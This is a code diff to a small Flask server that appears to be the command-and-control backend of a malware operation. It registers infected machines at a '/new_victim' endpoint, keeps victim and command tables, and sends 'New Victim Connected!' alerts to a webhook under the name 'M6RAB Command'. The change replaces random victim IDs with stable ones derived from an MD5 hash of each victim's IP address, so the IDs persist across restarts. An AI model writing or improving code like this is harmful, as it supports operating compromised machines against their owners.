@@ -1,6 +1,5 @@
 from flask import Flask, request, jsonify
-import requests, json, time, os
-import uuid
+import requests, json, time, os, hashlib
 
 app = Flask(__name__)
 
@@ -14,16 +13,14 @@ COMMANDS = {}
 @app.route('/new_victim', methods=['POST'])
 def new_victim():
     data = request.json
-    # توليد ID قصير (4 أرقام/حروف)
-    vid = str(uuid.uuid4())[:4] 
+    ip = data.get('ip', 'unknown')
     
-    # في حال صار تعارض بالحظ (نادر جداً)، نعيد التوليد
-    while vid in VICTIMS:
-        vid = str(uuid.uuid4())[:4]
-
-    VICTIMS[vid] = {"id": vid, "ip": data.get('ip'), "time": time.ctime()}
+    # توليد ID ثابت بناءً على الـ IP (عشان ما يتغير لو السيرفر نام)
+    vid = hashlib.md5(ip.encode()).hexdigest()[:4]
     
-    msg = f"**New Victim Connected!** ☠️\n**ID:** `{vid}`\n**Host:** {data.get('ip')}\n**Time:** {time.ctime()}"
+    VICTIMS[vid] = {"id": vid, "ip": ip, "time": time.ctime()}
+    
+    msg = f"**New Victim Connected!** ☠️\n**ID:** `{vid}`\n**Host:** {ip}\n**Time:** {time.ctime()}"
     requests.post(WEBHOOK_URL, json={"content": msg, "username": "M6RAB Command"})
     
     return jsonify({"status": "ok", "id": vid}), 200
